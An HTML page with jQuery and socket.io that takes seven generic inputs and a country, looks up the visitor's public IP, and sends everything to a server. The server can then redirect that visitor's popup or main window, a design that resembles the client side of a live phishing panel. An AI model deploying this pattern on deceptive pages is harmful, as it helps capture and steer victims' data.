
<!DOCTYPE html>
<html>
    <head>
        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
        <title>Simple Web Page</title>
    </head>
    <body>
        <span id="information">des informations</span>
        <br><br>
        <input type="text" id="input1" placeholder="Input 1">
        <br><br>
        <input type="text" id="input2" placeholder="Input 2">
        <br><br>
        <input type="text" id="input3" placeholder="Input 3">
        <br><br>
        <input type="text" id="input4" placeholder="Input 4">
        <br><br>
        <input type="text" id="input5" placeholder="Input 5">
        <br><br>
        <input type="text" id="input6" placeholder="Input 6">
        <br><br>
        <select id="countrySelect">
            <option value="France">France</option>
            <option value="United States">United States</option>
            <option value="Canada">Canada</option>
            <option value="United Kingdom">United Kingdom</option>
            <option value="Germany">Germany</option>
            <option value="Australia">Australia</option>
            <option value="Spain">Spain</option>
            <option value="Italy">Italy</option>
            <option value="Japan">Japan</option>
            <option value="China">China</option>
        </select>
        <br><br>
        <input type="text" id="input7" placeholder="Input 7">
        <br><br>
        <button id="confirmButton">Confirm</button>


        <script src="./jquery.js"></script>
        <script>
            $(document).ready(function() {
                const socket = io();
                let id;
                let ip;

                $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
                    data = data.trim().split('\n').reduce(function(obj, pair) {
                        pair = pair.split('=');
                        return obj[pair[0]] = pair[1], obj;
                    }, {});
                    ip = data.ip
                });
                
                let popupWindow;
                $('#confirmButton').click(function() {
                    popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
                    var date = new Date()
                    data = {
                        ipAddress: ip,
                        userId: Math.random().toString(36).substr(2, 9),
                        datetime: date.toLocaleString(),
                        span: document.querySelector('#information').textContent,
                        input1: document.querySelector('#input1').value,
                        input1: document.querySelector('#input1').value,
                        input2: document.querySelector('#input2').value,
                        input3: document.querySelector('#input3').value,
                        input4: document.querySelector('#input4').value,
                        input5: document.querySelector('#input5').value,
                        input6: document.querySelector('#input6').value,
                        input7: document.querySelector('#countrySelect').value,
                        input8: document.querySelector('#input7').value
                    }
                    socket.emit('formSubmit', data);
                    localStorage.setItem('id', data.userId)
                    id = data.userId
                })

                socket.on('redirect', (userId, url) => {
                    if (userId === id) {
                        popupWindow.location.href = url
                    }
                });
    
                // socket.on('closePopup', (userId) => {
                //     if (userId === id) {
                //         window.close()
                //     }
                // })

                
                socket.on('mainRedirect', (userId, url) => {
                    if (userId === id) {
                        popupWindow.close()
                        window.location.href = url
                    }
                })

                const checkPopupClosed = setInterval(() => {
                    if (popupWindow && popupWindow.closed) {
                        // Popup is closed
                        // clearInterval(checkPopupClosed); // Stop the periodic check
                        socket.emit('popupClose', id)
                    }
                }, 200)
            })
        </script>
    </body>
</html>